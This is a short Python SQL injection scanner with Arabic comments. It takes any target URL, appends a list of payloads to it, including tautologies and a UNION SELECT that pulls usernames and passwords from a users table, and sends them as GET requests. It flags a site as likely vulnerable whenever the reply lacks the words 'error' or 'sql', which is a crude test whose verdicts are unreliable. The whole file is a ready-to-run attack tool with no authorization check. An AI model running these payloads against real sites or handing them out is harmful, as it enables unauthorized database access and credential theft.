import requests

# إدخال عنوان URL المستهدف
target_url = input("أدخل عنوان URL المستهدف (مثال: http://example.com/vulnerable.php?id=): ")

# قائمة حمولة SQL Injection
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "' UNION SELECT NULL, NULL -- ",
    "' UNION SELECT username, password FROM users -- ",
]

print("\nبدء اختبار SQL Injection...")
print("---------------------------------------")

for payload in payloads:
    # إنشاء URL مع الحمولة
    test_url = target_url + payload
    print(f"اختبار: {test_url}")
    
    try:
        # إرسال الطلب
        response = requests.get(test_url)
        
        # التحقق من محتوى الرد
        if "error" not in response.text.lower() and "sql" not in response.text.lower():
            print(f"[+] قد تكون الثغرة موجودة! الرد:\n{response.text[:200]}...\n")
        else:
            print("[-] غير معرضة لهذه الحمولة.")
    
    except Exception as e:
        print(f"[!] حدث خطأ أثناء الاتصال: {e}")

print("تم الانتهاء من الاختبار.")
